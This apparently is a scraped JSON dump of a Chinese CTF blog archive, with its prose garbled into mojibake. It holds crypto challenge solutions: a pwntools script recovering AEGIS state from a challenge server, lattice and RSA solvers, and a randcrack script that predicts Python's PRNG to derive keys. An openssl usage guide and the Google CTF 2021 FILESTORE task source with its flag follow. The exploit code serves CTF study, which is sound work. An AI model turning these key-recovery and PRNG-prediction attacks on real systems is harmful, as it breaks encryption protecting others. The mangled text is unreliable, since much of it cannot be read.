å¾—åˆ°S[2][0] ç¬¬å…­ã€ä¸ƒæ¬¡ï¼š å¾—åˆ°S[3][0] æˆ‘ä»¬å¯ä»¥å¦‚æ³•ç‚®åˆ¶ï¼Œé€šè¿‡ä¿®æ”¹p[1][0],p[2][0]ï¼Œå¾—åˆ°S[2][0],S[3][0]ã€‚æ­¤æ—¶æˆ‘ä»¬æœ‰å…¬å¼:\nï¼ˆ3ï¼‰S[2][0] = AESRound(S[1][4])^S[1][0]^p[1][0] ==\u0026gt; ç›´æ¥é€†è¿ç®—ï¼Œå¯å¾—S[1][4]\rï¼ˆ9ï¼‰S[3][0] = AESRound(S[2][4])^S[2][0]^p[2][0] ==\u0026gt; åˆ©ç”¨ä¹‹å‰çš„æŠ€å·§ï¼Œå¯å¾—S[2][4]\rï¼ˆ10ï¼‰S[2][4] = AESRound(S[1][3])^S[1][4] ==\u0026gt; ç›´æ¥é€†è¿ç®—ï¼Œå¯å¾—S[1][3] æ­¤æ—¶æˆ‘ä»¬å°±æœ‰äº†S[1][0], S[1][3], S[1][4]ï¼Œå¹¶ä¸”é¢˜ç›®ä¸­æ³„éœ²äº†S[1][2]ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆåˆ©ç”¨\nï¼ˆ11ï¼‰C[1] = (S[2][0] \u0026amp; S[3][0]) ^ S[1][0] ^ S[4][0] ^ pt[0] å°±èƒ½å¾—åˆ°æœ€åçš„S[1][1]ï¼Œæ­¤æ—¶æ•´ä¸ªé¢˜æ³„éœ²å®Œæˆã€‚\nimport aes import os import aegis from aegis import _xor,_and from pwn import * import base64 def R(x): tmp = aes.bytes2matrix(x) aes.sub_bytes(tmp) aes.shift_rows(tmp) aes.mix_columns(tmp) return aes.matrix2bytes(tmp) def invR(x3): tmp = aes.bytes2matrix(x3) aes.inv_mix_columns(tmp) aes.inv_shift_rows(tmp) aes.inv_sub_bytes(tmp) return aes.matrix2bytes(tmp) def resolve(dk_1, ds_1, dk_2, ds_2): # here we check the tmpk = aes.bytes2matrix(dk_1) aes.inv_mix_columns(tmpk) aes.inv_shift_rows(tmpk) d_k1 = aes.matrix2bytes(tmpk) tmpk = aes.bytes2matrix(dk_2) aes.inv_mix_columns(tmpk) aes.inv_shift_rows(tmpk) d_k2 = aes.matrix2bytes(tmpk) # result should be unique res = bytearray(16) # try to bruce it for i in range(16): x1 = set() for c in range(256): if aes.s_box[c] ^ aes.s_box[c^ds_1[i]] == d_k1[i] and aes.s_box[c] ^ aes.s_box[c^ds_2[i]] == d_k2[i]: x1.add(c) res[i] = x1.pop() assert(len(res) == 16) return bytes(res) def encrypt(ph, aad, pt): ph.sendline(base64.standard_b64encode(pt)) ph.sendline(base64.standard_b64encode(aad)) ct = ph.recvline(keepends=False) ct = base64.standard_b64decode(ct.decode(\u0026#39;utf-8\u0026#39;)) tag = ph.recvline(keepends=False) tag = base64.standard_b64decode(tag.decode(\u0026#39;utf-8\u0026#39;)) return ct, tag def decrypt(ph, aad, pt, index, ct): left_index = (index+1)*16 right_index = (index+2)*16 enc, tag = encrypt(ph, aad, pt[2*index-1]) # print(\u0026#34;enc[{}:{}]\u0026#34;.format(left_index/32,right_index/32)) # print(\u0026#34;pt[{}:{}]\u0026#34;.format(2*index-1, 2*index)) ct1_2 = enc[left_index:right_index] # encrypt 3 enc, tag = encrypt(ph, aad, pt[2*index]) # print(pt[2*index]) ct1_3 = enc[left_index:right_index] # decrypt s10 # print(ct) # print(ct1_2) # print(ct) # print(ct1_2) dk1 = _xor(ct,ct1_2) dk2 = _xor(ct,ct1_3) # split S1/S5 # pt split ,too s = resolve(dk1, pt[2*index-1][16*(index-1):16*(index)], dk2, pt[2*index][16*(index-1):16*(index)]) return s def localTest(): ph = remote(\u0026#34;127.0.0.1\u0026#34;,\u0026#39;10090\u0026#39;) pt = [] padding = b\u0026#39;\\x00\u0026#39;*16 p0 = b\u0026#39;\\x00\u0026#39;*16 p1 = b\u0026#39;\\x00\u0026#39;*16 p2 = b\u0026#39;\\x00\u0026#39;*16 pt.append(p0+p1+p2+padding*2) # for i in range(1,7): # pt.append(bytes([i%2+1]*16)+padding) # for s10 pt.append(bytes([1]*16)+padding+padding) pt.append(bytes([2]*16)+padding+padding) # for s20 pt.append(padding+bytes([1]*16)+padding+padding) pt.append(padding+bytes([2]*16)+padding+padding) # for s30 pt.append(padding+padding+bytes([1]*16)+padding*2) pt.append(padding+padding+bytes([2]*16)+padding*2) iv = ph.recvline(keepends=False) aad = b\u0026#39;\u0026#39; # encrypt 1 enc, tag = encrypt(ph, aad, pt[0]) print(enc) ct = [] for i in range(5): ct.append(enc[i*16:(i+1)*16]) s10 = decrypt(ph, aad, pt, 1, ct[2]) # decrypt 2 s20 = decrypt(ph, aad, pt, 2, ct[3]) # decrypt 3 s30 = decrypt(ph, aad, pt, 3, ct[4]) # s20 = s10 xor R(s14) ==\u0026gt; s14 = invR(s20 xor s10) s14 = invR(_xor(s20, s10)) # s30 = s20 xor R(s24) ==\u0026gt; s24 = invR(s20 xor s30) # s24 = s14 xor R(s13) ==\u0026gt; s13 = invR(s14 xor s24) s24 = invR(_xor(s20, s30)) s13 = invR(_xor(s24, s14)) ph.recvuntil(\u0026#34;Oops, something leak:\u0026#34;) s12 = ph.recvline(keepends=False) print(s12) s12 = base64.standard_b64decode(s12.decode(\u0026#39;utf-8\u0026#39;)) # if pt = 00 then enc1 = (s12\u0026amp;s13) xor s14 xor s11 # -\u0026gt; s11 = enc1 xor s14 xor (s12\u0026amp;s13) enc1 = enc[16:16*2] s11 = _xor(s14, _xor(enc1, _and(s12, s13))) # s15 = _xor(s12, _xor(enc12, _and(s16, s17))) s1 = s10+s11+s12+s13+s14 ph.sendline(base64.standard_b64encode(s1)) ph.interactive() if __name__ == \u0026#34;__main__\u0026#34;: localTest() ç¬¬äº”ç©ºé—´2020 æœ‰å‡ ä¸ªè„šæœ¬å¯ä»¥å· # secrets # ä»ç®—æ³•ä¸­å¯çŸ¥æ»¡è¶³è¡¨è¾¾å¼ $c \\equiv a_0 x_1^2 x_2 + a_1 x_0 x_2^2 + a_2 x_1 x_2^2 \\mod p$\nç”±åŒä½™æ–¹ç¨‹æ„é€ ä¸€ä¸ªæ ¼å­\n$$ [1,0,0,0,a0 * k]\\ [0,1,0,0,a1 * k]\\ [0,0,1,0,a2 * k]\\ [0,0,0,1,c * k]\\ [0,0,0,0,p * k] $$\nä¸ºæ»¡è¶³LLLç®—æ³•ï¼Œkå–$2^{32}$ï¼Œæœ€åå³å¯æ±‚å‡ºç³»æ•°secret\np = 11262096115235666933802384984690234504897820609940312496824079226002897675039978540501589954252280529685081417842844576044060586114527797910785935210841729\ra0=4466180910473361859350789459675556137864618617420328788169821212611803391878541909630693681804259240992086737964898776136917699083088117808235133334853043\ra1=4887981314308588962908319833576800643350454985421459983243096186706959103231201770635994519162313869702469523675537059237606426233167545218659189978781299\ra2=6222963447321263242047563972710956077055676498584240298712594187843704642795447140199703936008141098341496844773625746023752040758807620531632616610912213\re=[[0, 2, 1], [1, 0, 2], [0, 1, 2]]\rc = 2521258878430983025589687858541798401695147486882642972456698768540389939874205997047593688658001566287798373100962518354180078132561217455997908984321742\rk=1\u0026lt;\u0026lt;32\rA = Matrix(ZZ,[\r[1,0,0,0,a0*k],\r[0,1,0,0,a1*k],\r[0,0,1,0,a2 *k],\r[0,0,0,1,c *k],\r[0,0,0,0, p *k]\r])\rA.LLL()\rres =[3463832903,3041163877,2616200387]\rc = long_to_bytes(0x0497ca92dff6e21bf2882b100d29660e478a8322d06f2d759c07b7ac865d1090)\rkey = hashlib.sha256(str(res).encode()).digest()\raes = AES.new(key, AES.MODE_ECB)\rprint(b\u0026#39;flag{\u0026#39; +aes.decrypt(c) + b\u0026#39;}\u0026#39;) data_protect # encrypt1 ç›´æ¥åˆ†è§£n\nencrypt2 æ— æ³•å®Œå…¨åˆ†è§£nï¼Œä½†æ˜¯çŸ¥é“å…¶ä¸­ä¸€ä¸ªå¤§ç´ æ•°å› å­ï¼Œç›´æ¥è½¬åŒ–ä¸º mod pä¸‹çš„rsa\nencrypt3 åœ¨Zmod(q) ä¸‹æ±‚è§£æ–¹ç¨‹\nencrypt4 randomçš„éšæœºæ•°é¢„æµ‹ï¼Œå‰é¢encrypt1æœ‰192bitï¼Œencrypt2æœ‰192bitï¼Œencrypt3ä¸­æœ‰612*32bitï¼Œåˆšå¥½æ»¡è¶³æ¡ä»¶ï¼Œå¯ä»¥é¢„æµ‹å‡ºkey\nencrypt5 ç»§ç»­éšæœºæ•°é¢„æµ‹ï¼Œå¯ä»¥é¢„æµ‹å‡ºç§é’¥x\nimport random\rfrom gmpy2 import *\rfrom Crypto.Util.number import *\rfrom Crypto.Cipher import AES\rfrom hashlib import sha256\rp=64390888389278700958517837593\rn=1428634580885297528425426676577388183501352157100030354079\rc=1019989333027273450782579103415892125563412519871045896869\rq=n//p\rd=invert(65537,(p-1)*(q-1))\rprint(long_to_bytes(pow(c,d,n)))\rc= 51342500906961408103258915228768275415740191204733837976903027942824981857691173079133834015102055031777401227355785897344053403243459544157687793960413113104670769220112095273635970933789525875595068985638845129357985043542698076902996316622632153857669586900278252852715534059153367015654872042990169865039\r# n=134949786048887319137407994803780389722367094355650515833817995038306119197600539524985448574053755793699799863164150565217726975197643634831307454431403854861515253009970594684699064052739820092115115614153962139870020206132705821506686959283747802946805730902605814619499301779892151365118901010526138311982\r# p = 11616788973244169211540879051135531683500013311175857700532973853592727185033846064980717918194540453710515251945345524986932165003196804187526561468278997\r# q=n//p\r# # print()\r# print(q-p)\r# d=invert(65537,(p-1)*(q-1))\r# print(long_to_bytes(pow(c,d,n))[:-20])\r# a,b=(11616788973244169211540879051135531683500013311175857700532973853592727185033846064980717918194540453710515251945345524986932165003196804187526561468278997,11616788973244169211540879051135531683500013311175857700532973853592727185033846064980717918194540453710515251945345524986932165003196804187526563615762644)\r# print((b-a)==2**31-1)\r# b\u0026#39;XIAOming\u0026#39;\r# b\u0026#39;17810111101\u0026#39;\r# b\u0026#39;XIAOming@cmail.com\u0026#39;\rc=51342500906961408103258915228768275415740191204733837976903027942824981857691173079133834015102055031777401227355785897344053403243459544157687793960413113104670769220112095273635970933789525875595068985638845129357985043542698076902996316622632153857669586900278252852715534059153367015654872042990169865039\rn=134949786048887319137407994803780389722367094355650515833817995038306119197600539524985448574053755793699799863164150565217726975197643634831307454431403854861515253009970594684699064052739820092115115614153962139870020206132705821506686959283747802946805730902605814619499301779892151365118901010526138311982\rp = 11616788973244169211540879051135531683500013311175857700532973853592727185033846064980717918194540453710515251945345524986932165003196804187526561468278997\rn=p\rd=invert(65537,(p-1))\rprint(long_to_bytes(pow(c,d,n))[:-20])\rq=5974434331\rkey=[[978955513, 2055248981, 3094004449, 411497641, 4183759491, 521276843, 1709604203, 3162773533, 2140722701, 782306144, 421964668, 356205891, 1039083484, 1911377875, 1661230549, 312742665, 3628868938, 2049082743], [3833871085, 2929837680, 2614720930, 4056572317, 3787185237, 93999422, 590001829, 429074138, 3012080235, 2336571108, 831707987, 3902814802, 2084593018, 316245361, 1799842819, 2908004545, 120773816, 2687194173], [3213409254, 3303290739, 742998950, 2956806179, 2834298174, 429260769, 769267967, 1301491642, 2415087532, 1055496090, 690922955, 2984201071, 3517649313, 3675968202, 3389582912, 2632941479, 186911789, 3547287806], [4149643988, 3811477370, 1269911228, 3709435333, 1868378108, 4173520248, 1573661708, 2161236830, 3266570322, 1611227993, 2539778863, 1857682940, 1020154001, 92386553, 3834719618, 3775070036, 3777877862, 2982256702], [4281981169, 2949541448, 4199819805, 3654041457, 3300163657, 1674155910, 1316779635, 66744534, 3804297626, 2709354730, 2460136415, 3983640368, 3801883586, 1068904857, 4178063279, 41067134, 752202632, 3143016757], [3078167402, 2059042200, 252404132, 415008428, 3611056424, 1674088343, 2460161645, 3311986519, 3130694755, 934254488, 898722917, 2865274835, 567507230, 1328871893, 3903457801, 2499893858, 492084315, 183531922], [3529830884, 4039243386, 233553719, 4118146471, 1646804655, 2089146092, 2156344320, 2329927228, 508323741, 1931822010, 579182891, 176447133, 597011120, 3261594914, 2845298788, 3759915972, 3095206232, 3638216860], [3352986415, 4264046847, 3829043620, 2530153481, 3421260080, 1669551722, 4240873925, 2101009682, 3660432232, 4224377588, 929767737, 3729104589, 2835310428, 1727139644, 1279995206, 1355353373, 2144225408, 1359399895], [3105965085, 818804468, 3230054412, 2646235709, 4053839846, 2878092923, 587905848, 1589383219, 2408577579, 880800518, 28758157, 1000513178, 2176168589, 187505579, 89151277, 1238795748, 8168714, 3501032027], [3473729699, 1900372653, 305029321, 2013273628, 1242655400, 4192234107, 2446737641, 1341412052, 304733944, 4174393908, 2563609353, 3623415321, 49954007, 3130983058, 425856087, 2331025419, 34423818, 2042901845], [1397571080, 1615456639, 1840339411, 220496996, 2042007444, 3681679342, 2306603996, 732207066, 663494719, 4092173669, 3034772067, 3807942919, 111475712, 2065672849, 3552535306, 138510326, 3757322399, 2394352747], [371953847, 3369229608, 1669129625, 168320777, 2375427503, 3449778616, 1977984006, 1543379950, 2293317896, 1239812206, 1198364787, 2465753450, 3739161320, 2502603029, 1528706460, 1488040470, 3387786864, 1864873515], [1356892529, 1662755536, 1623461302, 1925037502, 1878096790, 3682248450, 2359635297, 1558718627, 116402105, 3274502275, 2436185635, 771708011, 3484140889, 3264299013, 885210310, 4225779256, 363129056, 2488388413], [2636035482, 4140705532, 3187647213, 4009585502, 351132201, 2592096589, 3785703396, 750115519, 3632692007, 3936675924, 3635400895, 3257019719, 1928767495, 2868979203, 622850989, 3165580000, 4162276629, 4157491019], [1272163411, 1251211247, 357523138, 1233981097, 1855287284, 4079018167, 4028466297, 92214478, 4290550648, 648034817, 1247795256, 3928945157, 1199659871, 397659647, 3360313830, 561558927, 3446409788, 2727008359], [1470343419, 3861411785, 953425729, 65811127, 458070615, 1428470215, 3101427357, 1137845714, 1980562597, 4120983895, 45901583, 2869582150, 427949409, 3025588000, 3231450975, 3313818165, 4015642368, 3197557747], [2452385340, 111636796, 897282198, 4273652805, 1223518692, 3680320805, 2771040109, 3617506402, 3904690320, 77507239, 3010900929, 4099608062, 546322994, 1084929138, 902220733, 4054312795, 1977510945, 735973665], [3729015155, 3027108070, 1442633554, 1949455360, 2864504565, 3673543865, 446663703, 3515816196, 1468441462, 897770414, 2831043012, 707874506, 1098228471, 1225077381, 3622448809, 2409995597, 3847055008, 1887507220], [1839061542, 1963345926, 2600100988, 1703502633, 1824193082, 3595102755, 2558488861, 2440526309, 3909166109, 1611135411, 2809397519, 1019893656, 3281060225, 2387778214, 2460059811, 198824620, 1645102665, 865289621], [224442296, 3009601747, 3066701924, 1774879140, 880620935, 2676353545, 3748945463, 1994930827, 75275710, 3710375437, 4132497729, 3010711783, 3731895534, 2434590580, 3409701141, 2209951200, 995511645, 3571299495], [2337737600, 110982073, 2985129643, 1668549189, 3298468029, 698015588, 2945584297, 1036821195, 4249059927, 3384611421, 3304378629, 1307957989, 602821252, 184198726, 1182960059, 4200496073, 1562699893, 3320841302], [5866561, 2442649482, 479821282, 2687097642, 3347828225, 1876332308, 2704295851, 2952277070, 1803967244, 2837783916, 658984547, 3605604364, 1931924322, 3285319978, 556150900, 3795666798, 261321502, 1040433381], [3855222954, 3565522064, 1841853882, 1066304362, 3552076734, 3075952725, 2193242436, 2052898568, 2341179777, 3089412493, 165812889, 4196290126, 3568567671, 28097161, 2249543862, 1251207418, 522526590, 765541973], [1801734077, 2132230169, 667823776, 3900096345, 3119630138, 3620542178, 2900630754, 30811433, 608818254, 1040662178, 900811411, 3221833258, 43598995, 1818995893, 2718507668, 3445138445, 3217962572, 1437902734], [1812768224, 392114567, 2694519859, 1941199322, 2523549731, 2078453798, 851734499, 2376090593, 2069375610, 4084690114, 246441363, 4154699271, 58451971, 31806021, 4158724930, 2741293247, 3230803936, 2790505999], [3906342775, 2231570871, 1258998901, 1517292578, 162889239, 3130741176, 3925266771, 1780222960, 2378568279, 3873144834, 1597459529, 1581197809, 4101706041, 196019642, 1439141586, 587446072, 2012673288, 1280875335], [4058452685, 653145648, 553051697, 1406542226, 4053722203, 994470045, 2066358582, 3919235908, 2315900402, 3236350874, 172880690, 3104147616, 489606166, 3898059157, 200469827, 665789663, 3116633449, 4137295625], [1460624254, 4286673320, 2664109800, 1995979611, 4091742681, 2639530247, 4240681440, 2169059390, 1149325301, 3139578541, 2320870639, 3148999826, 4095173534, 2742698014, 3623896968, 2444601912, 1958855100, 1743268893], [2187625371, 3533912845, 29086928, 543325588, 4247300963, 1972139209, 272152499, 4276082595, 3680551759, 1835350157, 3921757922, 2716774439, 1070751202, 69990939, 3794506838, 699803423, 3699976889, 40791189], [539106994, 1670272368, 3483599225, 2867955550, 2207694005, 1126950203, 693920921, 2333328675, 539234245, 1961438796, 3126390464, 1118759587, 59715473, 1450076492, 4101732655, 3658733365, 940858890, 1262671744], [3092624332, 2175813516, 3355101899, 3657267135, 770650398, 359506155, 4149470178, 3763654751, 1184381886, 942048015, 523057971, 1098635956, 1732951811, 150067724, 2417766207, 4152571821, 2759971924, 4284842765], [3336022203, 2569311431, 2752777107, 1441977867, 1279003682, 3861567631, 1064716472, 3046493996, 1339401643, 39466446, 1464905290, 420733872, 2057911345, 2418624800, 2193625430, 1558527155, 4224908000, 207684355], [2681129718, 4210889596, 4051161171, 3131196482, 1128312875, 938670840, 2828563599, 3078146488, 1102989364, 3557724304, 156013303, 2371355565, 3608679353, 3513837899, 155622460, 396656112, 2493417457, 876296360], [3135876409, 181875076, 3662181650, 3851859805, 3626146919, 90441351, 1944988720, 585429580, 3158268550, 1399100291, 3688843295, 2851190, 2670576474, 3177735154, 3479499727, 197376977, 1790622954, 2393956089]]\rcipher=[595403492, 3329072201, 2030986893, 4171901788, 3978623752, 1983221945, 2446721844, 2357069183, 4157116254, 1084149362, 5164304343, 2285835942, 2562444158, 1580792970, 123176562, 878938066, 1581756453, 5868219323, 2039976783, 734750925, 1594241262, 4167440639, 3051132298, 657904326, 2869165250, 1240654684, 2667941558, 4488763635, 3975062760, 4362407867, 2329286887, 1929259095, 4743673673, 3503908479]\r#æœ‰é™åŸŸä¸‹æ±‚çº¿æ€§æ–¹ç¨‹ key*x=cipher å¾—åˆ° x=[88,73,65,79,109,105,110,103,64,99,109,97,105,108,46,99,111,109]\rx=[88,73,65,79,109,105,110,103,64,99,109,97,105,108,46,99,111,109]\rfor i in x:\rprint(chr(i),end=\u0026#39;\u0026#39;)\rprint()\rfrom randcrack import RandCrack\rrc = RandCrack()\rt=[]\rfor i in key:\rfor j in i:\rt.append(j)\rp= 64390888389278700958517837593\rp_=64390888389278700958517837503\rq= 22186905890293167337018474103\rq_=22186905890293167337018474045\rpd=bytes_to_long(b\u0026#39;\\xf1\\x0f\\xb5\\xb5\\xae\\xf0\\x05\\x92BWR\\xd0\u0026gt;\\x91\\x0cv\\xbc ]\\x81\u0026#39;)\rd=1644175009\r# for qq in range(p_+1,p+1):\r# for pp in range(q_+1,q+1):\r# rc = RandCrack()\r# pp,qq=22186905890293167337018474101 ,64390888389278700958517837515\r# rc.submit(pp\u0026amp;0xffffffff)\r# rc.submit((pp\u0026gt;\u0026gt;32)\u0026amp;0xffffffff)\r# rc.submit((pp\u0026gt;\u0026gt;64)\u0026amp;0xffffffff)\r# rc.submit(qq\u0026amp;0xffffffff)\r# rc.submit((qq\u0026gt;\u0026gt;32)\u0026amp;0xffffffff)\r# rc.submit((qq\u0026gt;\u0026gt;64)\u0026amp;0xffffffff)\r# rc.submit(pd\u0026amp;0xffffffff)\r# rc.submit((pd\u0026gt;\u0026gt;32)\u0026amp;0xffffffff)\r# rc.submit((pd\u0026gt;\u0026gt;64)\u0026amp;0xffffffff)\r# rc.submit((pd\u0026gt;\u0026gt;96)\u0026amp;0xffffffff)\r# rc.submit((pd\u0026gt;\u0026gt;128)\u0026amp;0xffffffff)\r# rc.submit(d)\r# for i in range(612):\r# rc.submit(t[i])\r# r=0\r# for i in range(4):\r# tt=rc.predict_randrange(0, 4294967295)\r# r+=tt\u0026lt;\u0026lt;(32*i)\r# key = long_to_bytes(r)\r# a = AES.new(key,AES.MODE_ECB)\r# cipher = a.decrypt(long_to_bytes(206157860554052840058147052190501816262))\r# if(b\u0026#34;.\u0026#34; in cipher and b\u0026#34;_\u0026#34; in cipher):\r# print(pp,qq,cipher)\rrc = RandCrack()\rpp,qq=22186905890293167337018474101 ,64390888389278700958517837515\rrc.submit(pp\u0026amp;0xffffffff)\rrc.submit((pp\u0026gt;\u0026gt;32)\u0026amp;0xffffffff)\rrc.submit((pp\u0026gt;\u0026gt;64)\u0026amp;0xffffffff)\rrc.submit(qq\u0026amp;0xffffffff)\rrc.submit((qq\u0026gt;\u0026gt;32)\u0026amp;0xffffffff)\rrc.submit((qq\u0026gt;\u0026gt;64)\u0026amp;0xffffffff)\rrc.submit(pd\u0026amp;0xffffffff)\rrc.submit((pd\u0026gt;\u0026gt;32)\u0026amp;0xffffffff)\rrc.submit((pd\u0026gt;\u0026gt;64)\u0026amp;0xffffffff)\rrc.submit((pd\u0026gt;\u0026gt;96)\u0026amp;0xffffffff)\rrc.submit((pd\u0026gt;\u0026gt;128)\u0026amp;0xffffffff)\rrc.submit(d)\rfor i in range(612):\rrc.submit(t[i])\rr=0\rfor i in range(4):\rtt=rc.predict_randrange(0, 4294967295)\rr+=tt\u0026lt;\u0026lt;(32*i)\rr=0\rfor i in range(16):\rtt=rc.predict_randrange(0, 4294967295)\rr+=tt\u0026lt;\u0026lt;(32*i)\rr=0\rfor i in range(16):\rtt=rc.predict_randrange(0, 4294967295)\rr+=tt\u0026lt;\u0026lt;(32*i)\rq,g,h=12978641035734240236103271206089768414668942591886536148174561520305999709207251794343245618040094770557383475160630029074093741713376984903835480969208293, 8720814254745089777252083344348851268520692318828030452122549926748859741402125799736178655620806485161358327515735405190921467358304697344848268434382637 ,12099509832855805422212389412411496487421102553928260849593639134939000597394291986995380611893676422073382092596749292780050077552342507027413423034163272\rc1,c2=11037273227249384815270477914945574769214510988660737721762529999297862289189700923584519665480479763578699379894125409227652084419849423696932374103120058, 12087705792059361632307776684083188202195541184973623631541534293387150491895486080323457832843438088187773977539401538646693773152621936983533667985808470\rprint(long_to_bytes(invert(pow(c1,r,q),q)*c2%q)) ","date":"31 July 2021","permalink":"/achieve/%E5%9E%83%E5%9C%BE%E9%A2%98%E5%BD%92%E6%A1%A3/","section":"archive","summary":"","title":"åƒåœ¾é¢˜å½’æ¡£"},{"content":"\ropensslåŸºæœ¬ä½¿ç”¨æŒ‡åŒ— # é‰´äºç½‘ä¸Šèƒ½æ‰¾åˆ°çš„éƒ½å†™å¾—åƒshitä¸€æ ·\næ±‚äººä¸å¦‚æ±‚å·±äº†å±äºæ˜¯\nrsa # rsa pemå¯†é’¥æ–‡ä»¶æœ‰ $n,p,q,dp,dq,e,d,[p^{-1}]_q$\næ‰€æœ‰å‚æ•°\nç§é’¥\nopenssl rsa -in ./akey.pem -text å…¬é’¥\nopenssl rsa -in ./akey.pem -text -pubin ç”Ÿæˆ\nopenssl genrsa \u0026gt; key.pem openssl genrsa -out privkey.pem 2048 ecc # ec å¯†é’¥æ–‡ä»¶æœ‰å‚æ•°\næ›²çº¿ï¼š$a,b,p,ç”Ÿæˆå…ƒGï¼Œé˜¶æ•°N$\nå¯†é’¥ï¼š$ç§é’¥dï¼Œå…¬é’¥P=d*G$\næå–\nopenssl ec -in ./p384-key.pem -text æå–csrè¯ä¹¦ # openssl req -new -key privkey.pem -out ca.csr\næå–å¯†é’¥ä¿¡æ¯ # å…¬ç§é’¥æ¨¡æ•° # openssl rsa -in .\\pubkey.pem -pubout -modulus\nopenssl rsa -in .\\pubkey.pem -pubin -modulus\næå–æ‰€æœ‰ä¿¡æ¯ # openssl asn1parse -i -in privkey.pem\nå…¬é’¥è¦æŒ‡å®šåç§»æŸ¥çœ‹ï¼Œbit stringçš„åç§»æ˜¯19\nopenssl asn1parse -i -in .\\pubkey.pem -strparse 19\npemã€deræ ¼å¼è½¬åŒ– # openssl rsa -in .\\private.pem -outform der -out .\\private.der\né™¤äº†ç”Ÿå­©å­ä»€ä¹ˆéƒ½èƒ½å¹²çš„python # crypto yyds\nfrom Crypto.PublicKey import RSA\nè¯»å–å…¬é’¥ä¿¡æ¯ # rsakey = RSA.importKey(open(\u0026#34;public.key\u0026#34;, \u0026#34;r\u0026#34;).read()) n = rsakey.n e = rsakey.e print(\u0026#34;n=%\\ne=%d\u0026#34;,n,e) ç”Ÿæˆç§˜é’¥å¯¹æ–‡ä»¶ # rsa = RSA.generate(2048) public_key = rsa.publickey().exportKey() f = open(\u0026#34;public_key.key\u0026#34;, \u0026#34;w\u0026#34;) f.write(public_key.decode()) f.close() private_key = rsa.exportKey() f = open(\u0026#34;private_key.key\u0026#34;, \u0026#34;w\u0026#34;) f.write(private_key.decode()) f.close() å¯¹æ–‡ä»¶åŠ è§£å¯† # è½½å…¥å¡«å……æ–¹å¼\nfrom Crypto.Cipher import PKCS1_OAEP\nrsakey=RSA.importKey(open(\u0026#34;public_key.key\u0026#34;,\u0026#34;r\u0026#34;).read()) rsa = PKCS1_OAEP.new(rsakey) encrypt = rsa.encrypt(flag.encode()) rsakey=RSA.importKey(open(\u0026#34;private_key.key\u0026#34;,\u0026#34;r\u0026#34;).read()) rsa = PKCS1_OAEP.new(rsakey) decrypt = rsa.decrypt(f.read()) ç”Ÿæˆ private_key.key # rsa_components = (n, e, int(d), p, q) rsa = RSA.construct(rsa_components) public_key = rsa.exportKey() # æ­¤rsaä¸ä¸Šæ–‡éšæœºç”Ÿæˆçš„rsaç›¸åŒ f = open(\u0026#34;public_key.key\u0026#34;, \u0026#34;w\u0026#34;) f.write(public_key.decode()) f.close() ","date":"27 July 2021","permalink":"/achieve/2019to2021/openssl/","section":"archive","summary":"","title":"openssl/pem"},{"content":"\r[toc]\ngoogle çš„é¢˜çœŸçš„å¤ªæœ‰æ„æ€äº†ï¼Œå¯æƒœè‡ªå·±åšå‡ºæ¥çš„å°±åªæœ‰è¿™ä¸€ä¸ªğŸ˜¥ğŸ˜¥ğŸ˜¥ æœ‰æ—¶é—´çœ‹çœ‹AESGCMæ€ä¹ˆOracleçš„\nFILESTORE # TASK\n# Copyright 2021 Google LLC # # Licensed under the Apache License, Version 2.0 (the \u0026#34;License\u0026#34;); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # https://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an \u0026#34;AS IS\u0026#34; BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. import os, secrets, string, time # from flag import flag flag = \u0026#39;CTF{CR1M3_0f_d3dup1ic4ti0n}\u0026#39; def main(): # It\u0026#39;s a tiny server... blob = bytearray(2**16) files = {} used = 0 # Use deduplication to save space. def store(data): nonlocal used MINIMUM_BLOCK = 16 MAXIMUM_BLOCK = 1024 part_list = [] while data: prefix = data[:MINIMUM_BLOCK] ind = -1 bestlen, bestind = 0, -1 while True: ind = blob.find(prefix, ind+1) if ind == -1: break length = len(os.path.commonprefix([data, bytes(blob[ind:ind+MAXIMUM_BLOCK])])) if length \u0026gt; bestlen: bestlen, bestind = length, ind if bestind != -1: part, data = data[:bestlen], data[bestlen:] part_list.append((bestind, bestlen)) else: part, data = data[:MINIMUM_BLOCK], data[MINIMUM_BLOCK:] blob[used:used+len(part)] = part part_list.append((used, len(part))) used += len(part) assert used \u0026lt;= len(blob) fid = \u0026#34;\u0026#34;.join(secrets.choice(string.ascii_letters+string.digits) for i in range(16)) files[fid] = part_list return fid def load(fid): # print(files) data = [] for ind, length in files[fid]: data.append(blob[ind:ind+length]) return b\u0026#34;\u0026#34;.join(data) print(\u0026#34;Welcome to our file storage solution.\u0026#34;) # Store the flag as one of the files. store(bytes(flag, \u0026#34;utf-8\u0026#34;)) while True: print() print(\u0026#34;Menu:\u0026#34;) print(\u0026#34;- load\u0026#34;) print(\u0026#34;- store\u0026#34;) print(\u0026#34;- status\u0026#34;) print(\u0026#34;- exit\u0026#34;) choice = input().strip().lower() if choice == \u0026#34;load\u0026#34;: print(\u0026#34;Send me the file id...\u0026#34;) fid = input().strip() data = load(fid) print(data.decode()) elif choice == \u0026#34;store\u0026#34;: print(\u0026#34;Send me a line of data...\u0026#34;) data = input().strip() fid = store(bytes(data, \u0026#34;utf-8\u0026#34;)) print(\u0026#34;Stored! Here\u0026#39;s your file id:\u0026#34;) print(fid) elif choice == \u0026#34;status\u0026#34;: print(\u0026#34;User: ctfplayer\u0026#34;) print(\u0026#34;Time: %s\u0026#34; % time.asctime()) kb = used / 1024.0 print(len(blob)) kb_all = len(blob) / 1024.0 print(\u0026#34;Quota: %0.3fkB/%0.3fkB\u0026#34; % (kb, kb_all)) print(\u0026#34;Files: %d\u0026#34; % len(files)) elif choice == \u0026#34;exit\u0026#34;: break else: print(\u0026#34;Nope.\u0026#34;) try: main() except Exception: print(\u0026#34;Nope.\u0026#34;) time.sleep(1) è®¾è®¡äº†ä¸€ä¸ªå­—ç¬¦ä¸²å‚¨å­˜ç³»ç»Ÿ,ä¼šå¤ç”¨flagçš„å­—ç¬¦ä¸²æ¥è¾¾åˆ°å‡å°‘å†…å­˜çš„ç›®çš„,è§‚å¯Ÿå†…å­˜å¯ä»¥åˆ¤æ–­è¾“å…¥çš„å­—ç¬¦ä¸²æ˜¯å¦ä½flagçš„å­å­—ç¬¦ä¸²\nb\u0026#39;COqrVqqo621exq2q\\n\u0026#39; b\u0026#39;\\nMenu:\\n- load\\n- store\\n- status\\n- exit\\n\u0026#39; ic| flag_: 